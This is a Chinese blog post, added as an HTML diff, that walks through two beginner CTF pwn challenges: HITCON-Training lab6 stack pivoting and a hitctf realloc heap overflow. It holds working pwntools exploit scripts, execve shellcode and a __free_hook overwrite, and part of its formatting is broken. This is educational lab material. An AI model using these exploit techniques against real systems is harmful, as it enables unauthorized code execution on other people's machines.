@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>pwn 新手向 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="这是我前年写的两个很简单的 pwn 题，很常规的栈迁移思路，我现在都看不懂了，2333。得记下来以后没事了看。 第一个这个思路是自己做一道很简单的题时一步一步边优化边想的，顺着这个思路加深了对栈迁移的理解，分享一下。但本人文笔实在垃圾，各位看官有觉得不对劲的请在评论区留言 题目链接如下（文末也放了链接 lab6  程序大致分析保护措施如此这般： └&gt; checksec migration">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn 新手向">
+<meta property="og:url" content="http://example.com/2022/01/02/2022-01-02-pwnbeginer/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这是我前年写的两个很简单的 pwn 题，很常规的栈迁移思路，我现在都看不懂了，2333。得记下来以后没事了看。 第一个这个思路是自己做一道很简单的题时一步一步边优化边想的，顺着这个思路加深了对栈迁移的理解，分享一下。但本人文笔实在垃圾，各位看官有觉得不对劲的请在评论区留言 题目链接如下（文末也放了链接 lab6  程序大致分析保护措施如此这般： └&gt; checksec migration">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-01T19:18:21.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2022-01-02-pwnbeginer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/02/2022-01-02-pwnbeginer/" class="article-date">
+  <time class="dt-published" datetime="2022-01-01T19:18:21.000Z" itemprop="datePublished">2022-01-02</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      pwn 新手向
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这是我前年写的两个很简单的 pwn 题，很常规的栈迁移思路，我现在都看不懂了，2333。得记下来以后没事了看。</p>
+<h1 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h1><p>这个思路是自己做一道很简单的题时一步一步边优化边想的，顺着这个思路加深了对栈迁移的理解，分享一下。但本人文笔实在垃圾，各位看官有觉得不对劲的请在评论区留言</p>
+<h1 id="题目链接如下（文末也放了链接"><a href="#题目链接如下（文末也放了链接" class="headerlink" title="题目链接如下（文末也放了链接"></a>题目链接如下（文末也放了链接</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab6/migration">lab6</a></p>
+</blockquote>
+<h1 id="程序大致分析"><a href="#程序大致分析" class="headerlink" title="程序大致分析"></a>程序大致分析</h1><p>保护措施如此这般：</p>
+<pre><code>└&gt; checksec migration 
+[*] &#39;/home/pic/Desktop/hitcon/migration&#39;
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+	
+</code></pre>
+<p>程序如此这般：</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [esp+0h] [ebp-28h]
+
+  if ( count != 1337 )
+    exit(1);
+  ++count;
+  setvbuf(_bss_start, 0, 2, 0);
+  puts(&quot;Try your best :&quot;);
+  return read(0, &amp;buf, 0x40u);
+}
+</code></pre>
+<p>程序很干净，存在<code>read</code>函数的溢出，且溢出字节为 0x28 即 40 ，但不像 64 位有很好用的万能 gadget ，之前做过类似的题，记得套路如下：</p>
+<ul>
+<li>通过 read 函数把 rop 链读到 bss 端</li>
+<li>构造 bss 端</li>
+<li>迁移到 bss 端执行</li>
+</ul>
+<p>经过大致分析常规套路，应该是要有三次 shellcode ，因为构造 bss 端时必然无法执行任何操作，但其实在构造 bss 时候可以把第三次的起 shell 合并，即下方的 exp</p>
+<h1 id="带栈迁移的-ret2libc"><a href="#带栈迁移的-ret2libc" class="headerlink" title="带栈迁移的 ret2libc"></a>带栈迁移的 ret2libc</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">one_gadget = base+0x3ac69</span><br><span class="line">payload2 = p32(0)+p32(one_gadget)+p32(0)*8+p32(0x804A008+0x500)+p32(0x8048504)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>one_gadget</code>地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ one_gadget /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">...</span><br><span class="line">0x3ac69 execve(&quot;/bin/sh&quot;, esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>看一下第一次的 payload ：（填入的地址就是栈中）</p>
+<ul>
+<li>将 ebp 改为<code>0x804A008+0x28+0x500</code>，其中 0x28 是因为 ebp 在 read 时决定最重要的参数–地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x80484f4 &lt;main+73&gt;:	lea    eax,[ebp-0x28]</span><br><span class="line">0x80484f7 &lt;main+76&gt;:	push   eax</span><br><span class="line">0x80484f8 &lt;main+77&gt;:	push   0x0</span><br><span class="line">0x80484fa &lt;main+79&gt;:	call   0x8048380	; read 函数</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>0x80484EA</code>地址是 <code>call puts</code>，之后的排布就是 put_got 参数了，能直接把 puts 地址泄露出来，便于后边 <code>one_gadget</code> 的计算</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:080484E5                 push    offset s        ; &quot;Try your best :&quot;</span><br><span class="line">.text:080484EA                 call    puts</span><br><span class="line">.text:080484EF                 add     esp, 4</span><br><span class="line">.text:080484F2                 push    40h             ; nbytes</span><br><span class="line">.text:080484F4                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484F7                 push    eax             ; buf</span><br><span class="line">.text:080484F8                 push    0               ; fd</span><br><span class="line">.text:080484FA                 call    read</span><br></pre></td></tr></table></figure>
+
+<p>之后的第二次 payload （填写地址是<code>0x804A008+0x500</code>就是因为之前第一次 payload 的 ebp 变化引起的）：</p>
+<ul>
+<li>前 40 字节没什么说的，就是把 one_gadget 填到正确位置，方便起 shell</li>
+<li>之后的<code>p32(0x804A008+0x500)</code>就是本轮的 ebp 了</li>
+<li>之后<code>p32(0x8048504)</code>是</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048504                 leave</span><br><span class="line">.text:08048505                 retn</span><br></pre></td></tr></table></figure>
+
+<p>程序溢出时<code>ebp esp eip</code>三个寄存器状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0x804A008 + 0x500</span><br><span class="line">esp 无法直接控制</span><br><span class="line">eip 无法直接控制</span><br></pre></td></tr></table></figure>
+<p>之后的 <code>leave</code>片段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0</span><br><span class="line">esp = 0x804A008 + 0x500 + 4 </span><br><span class="line">eip 无法直接控制</span><br></pre></td></tr></table></figure>
+<p>经过 ret 变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0</span><br><span class="line">esp = 0x804A008 + 0x500 + 8</span><br><span class="line">eip = one_gadget</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 ret 地址填写的就是 one_gadget 地址，但是因为本题 bss 端地址固定，所以完全可以通过 mprotect 函数来修改 bss 可执行权限，达到向 bss 端写 shellcode 并执行的效果， exp 如下</p>
+<h1 id="带-mprotect-的-ret2shellcode"><a href="#带-mprotect-的-ret2shellcode" class="headerlink" title="带 mprotect 的 ret2shellcode"></a>带 mprotect 的 ret2shellcode</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">mp = base + libc.symbols[&#x27;mprotect&#x27;]</span><br><span class="line">one = base+0x3ac69</span><br><span class="line">shellcode = &quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload2 = shellcode+&#x27;a&#x27;*(40-len(shellcode))+p32(0)+p32(mp)+p32(0x804A008+0x500)+p32(0x804A000)+p32(0x1000)+p32(7)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>第一轮的 payload 没变，把第二轮的变成了</p>
+<ul>
+<li>前 40 字节是 shellcode 和 a 填充</li>
+<li>ebp 可以随意，用不到</li>
+<li>mprotect 函数地址</li>
+<li>ret 地址填 bss ，也即 shellcode 地址</li>
+<li>mprotect 用到的参数，达到<code>mprotect(0x804A000,0x1000,7)</code>的效果</li>
+</ul>
+<p>执行 mprotect 之前</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   /home/pic/Desktop/hitcon/migration</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>执行 mprotect 之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/pic/Desktop/hitcon/migration</span><br></pre></td></tr></table></figure>
+
+<p>有了可执行权限，跳转过去执行就 get shell 了</p>
+<h1 id="直接填入"><a href="#直接填入" class="headerlink" title="直接填入"></a>直接填入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">one = base+0x3ac69</span><br><span class="line">io.send(p32(0)*11+p32(one))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这招成功的核心在于第一次 payload 填的 ret 地址是 <code>0x80484EA</code> 等于执行了一遍下边的 <code>leave ret</code> ，让之前填入的 ebp 发挥了作用，有点困惑的可以自行调试深入体会，在此不予以赘述</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>经过上方的分析大家应该看到 ebp 用好对 exp 的编写和题目的理解有多大用处，尤其是最后一个。感觉自己之前一直有一个误区，就是填 ebp 就一定要填 <code>leave_ret</code> gadget ，后来发现不一定，一定要注意汇编前后语境，不遇到 ret 坚决不放松警惕。而且有时候把 main 函数中间某一段当作 ret 地址可以达到很多单纯构造 rop 链达不到的效果</p>
+<h1 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h1><p>最近佛系找题做,突然找到了一道去年 hitctf 的题,看网上也没有 writeup ,于是决定好好分析一波.太菜了,前后花了 5 个小时吧,服了,这题学了很多,分享出来</p>
+<h2 id="写在前面的程序"><a href="#写在前面的程序" class="headerlink" title="写在前面的程序"></a>写在前面的程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char* a = malloc(0x80);</span><br><span class="line">	char* b = malloc(0x10);</span><br><span class="line">	char* c = malloc(0x20);</span><br><span class="line">	char* d = malloc(0x20);</span><br><span class="line">	char* e = malloc(1);</span><br><span class="line">	a = realloc(a,0x20);</span><br><span class="line">	b = realloc(b,0x20);	//-------&gt;断点A</span><br><span class="line">	c = realloc(c,0x20);	//-------&gt;断点B</span><br><span class="line">	d = realloc(c,0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本程序意思便是 realloc 会重新排步堆空间,这里只介绍一下 a 和 b 块,剩下的可以自行调试.断到断点 A 处查看变化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x602030 ◂— 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$5 = 0x602010 &quot;&quot;</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 = 0x6020a0 &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>realloc(a,0x20)</code>只用到了 0x31 字节,之前 malloc 剩下的直接扔到了 fastbin 里,被 free 掉.这里注意一下 b 指向 0x6020a0 .单步运行断在 B 处查看变化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$3 = 0x602140 &quot;&quot;</span><br><span class="line">pwndbg&gt; x/8gx 0x602140-0x10</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602160:	0x0000000000000000	0x0000000000020ea1</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602090 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x602030 ◂— 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里 realloc 一个比之前大的会使之前的 b 直接被 free 掉,重新一个 malloc 一个合适的返给 b .</p>
+<p>前言结束</p>
+<h2 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h2><p>这题其实挺反常规的,程序的 bss 端 ptr 指向存放内容头,之后的内容头中有指向内容的指针,大致长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss-&gt;</span><br><span class="line">	**	0x31</span><br><span class="line">  title	name</span><br><span class="line">  time()	chunk_ptr</span><br><span class="line">  size	**</span><br><span class="line">  chk_ptr	-&gt;	content</span><br></pre></td></tr></table></figure>
+
+<p>在 edit 中有一个不太明显的堆溢出漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  if ( *((_DWORD *)ptr[v2] + 8) != v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = ptr[v2];</span><br><span class="line">    v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);	//realloc()函数,漏洞利用关键点</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;new message:&quot;);</span><br><span class="line">  return read(0, *((void **)ptr[v2] + 3), *((signed int *)ptr[v2] + 8));	//漏洞点, message size 未更新</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="泄漏-libc"><a href="#泄漏-libc" class="headerlink" title="泄漏 libc"></a>泄漏 libc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn2&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./pwn2&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(title,name,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendafter(&#x27;title:\n&#x27;,title)</span><br><span class="line">	p.sendafter(&#x27;name:\n&#x27;,name)</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;message:\n&#x27;,message)</span><br><span class="line">def edit(ind,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;new message:\n&#x27;,message)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br></pre></td></tr></table></figure>
+
+<p>这是框架函数,之后一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(&#x27;a&#x27;,&#x27;a&#x27;,0x80,&#x27;a&#x27;*0x80)</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">让他 malloc 出来一块不属于 fastbin 的堆,再</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>new(‘b’,’b’,1,’b’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">防止`topchunk`吞并上一个,然后编辑`edit(0,0x90,&#x27;1&#x27;*8)`让新的 size 和旧的不等触发</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>v1[3] &#x3D; realloc(*((void **)ptr[v2] + 3), v3 + 1);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这样我们之前的第一个块就到了`unsortedbin`中,然后在`new(&#x27;d&#x27;,&#x27;d&#x27;,0x80,&#x27;d&#x27;*8)`一块,这样子内容头就用的是 unsortedbin ,填入 title 和 name 时候占用的就是之前 unsortedbin 残留的 fd 和 bk 了,填充一个字节之后 `show(2)` 让它泄漏出来减去偏移字节,这样就得到了 libc</span><br><span class="line"></span><br><span class="line">## getshell</span><br><span class="line"></span><br><span class="line">有了 libc 后基本思路就确定了,修改内容头使其指向`__free_hook`,并直接 edit 为 one_gadget ,之后 free 触发 getshell ,所以关键便是如何溢出覆盖内容头</span><br><span class="line"></span><br><span class="line">首先</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>new(‘a’,’a’,0xf7,’a’*0x20)<br>edit(3,0xb8,’0’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">构造一个堆,并编辑,使得该块底下有一块可控范围,并控制在 0x30 的 fastbin 中,便于能溢出到内容头,之后</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>new(‘d’,’d’,1,’d’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这个块就中招了,我们能够溢出它,之后填入我们精心构造的堆</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>edit(3,0xb8,’\x01’*0xc8+p64(0x31)*4+p64(libc.symbols[‘__free_hook’] + leak)+p64(0x51))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中的排步效果如下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>0x1474310:	0x0101010101010101	0x0000000000000031<br>0x1474320:	0x0000000000000031	0x0000000000000031<br>0x1474330:	0x0000000000000031	0x00007f15621627a8<br>0x1474340:	0x0000000000000051	0x0000000000020cc1</p>
